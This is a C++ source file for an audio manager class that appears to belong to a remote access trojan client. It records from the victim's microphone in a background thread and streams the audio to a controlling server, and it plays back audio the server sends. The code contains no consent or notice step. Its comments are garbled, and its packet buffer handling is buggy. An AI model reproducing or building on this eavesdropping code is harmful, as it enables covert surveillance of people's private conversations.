// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "AudioManager.h"
#include "Common.h"
#include <Mmsystem.h>
#include <IOSTREAM>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
	Mprintf("new CAudioManager %p\n", this);

	m_bIsWorking = FALSE;
	m_AudioObject = NULL;

	if (Initialize()==FALSE)
	{
		return;
	}

	BYTE	bToken = TOKEN_AUDIO_START;
	m_ClientObject->Send2Server((char*)&bToken, 1);

	WaitForDialogOpen();    //�ȴ��Ի����
	szPacket = NULL;

	m_hWorkThread = __CreateThread(NULL, 0, WorkThread, (LPVOID)this, 0, NULL);
}


VOID  CAudioManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_NEXT:
		{
			if (1 == ulLength)
				NotifyDialogIsOpen();
			break;
		}
	default:
		{
			m_AudioObject->PlayBuffer(szBuffer, ulLength);
			break;
		}
	}
}

DWORD CAudioManager::WorkThread(LPVOID lParam)   //���������������
{
	CAudioManager *This = (CAudioManager *)lParam;
	while (This->m_bIsWorking)
	{
		if(!This->SendRecordBuffer())
			Sleep(50);
	}

	Mprintf("CAudioManager WorkThread end\n");

	return 0;
}

BOOL CAudioManager::SendRecordBuffer()
{	
	DWORD	dwBufferSize = 0;
	BOOL	dwReturn = 0;
	//����õ� ��Ƶ����
	LPBYTE	szBuffer = m_AudioObject->GetRecordBuffer(&dwBufferSize);
	if (szBuffer == NULL)
		return 0;
	//���仺����
	szPacket = szPacket ? szPacket : new BYTE[dwBufferSize + 1];
	//��������ͷ
	szPacket[0] = TOKEN_AUDIO_DATA;     //�����ض˷��͸���Ϣ
	//���ƻ�����
	memcpy(szPacket + 1, szBuffer, dwBufferSize);
	szPacket[dwBufferSize] = 0;
	//���ͳ�ȥ
	if (dwBufferSize > 0)
	{
		dwReturn = m_ClientObject->Send2Server((char*)szPacket, dwBufferSize + 1);
	}
	return dwReturn;	
}

CAudioManager::~CAudioManager()
{
	m_bIsWorking = FALSE;                            //�趨����״̬Ϊ��
	WaitForSingleObject(m_hWorkThread, INFINITE);    //�ȴ� �����߳̽���
	if (m_hWorkThread)
		CloseHandle(m_hWorkThread);

	if (m_AudioObject!=NULL)
	{
		delete m_AudioObject;
		m_AudioObject = NULL;
	}
	if (szPacket)
	{
		delete [] szPacket;
		szPacket = NULL;
	}
	Mprintf("~CAudioManager %p\n", this);
}

//USB  
BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())   //��ȡ���������豸����Ŀ  ʵ�ʾ��ǿ�����û������
		return FALSE;

	// SYS    SYS P	
	// ����ʹ����.. ��ֹ�ظ�ʹ��
	if (m_bIsWorking==TRUE)
	{
		return FALSE;
	}

	m_AudioObject = new CAudio;  //������

	m_bIsWorking = TRUE;
	return TRUE;
}
